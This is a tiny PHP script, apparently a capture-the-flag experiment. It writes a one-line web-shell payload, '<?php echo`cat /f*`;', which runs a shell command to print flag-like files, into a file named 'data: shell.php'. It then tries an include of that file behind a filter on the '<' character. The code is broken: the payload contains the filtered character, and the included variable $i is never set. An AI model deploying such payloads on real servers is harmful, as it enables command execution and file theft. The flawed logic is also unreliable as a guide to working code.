<?php
    $f_name = "data: shell.php";
    $f_content = "<?php echo`cat /f*`;";

    file_put_contents($f_name, $f_content);
    if(isset($f_name) && stripos(file_get_contents($f_name), '<') === FALSE)
    {
        echo "Passed test!";
        @include($i);
    } 
?>
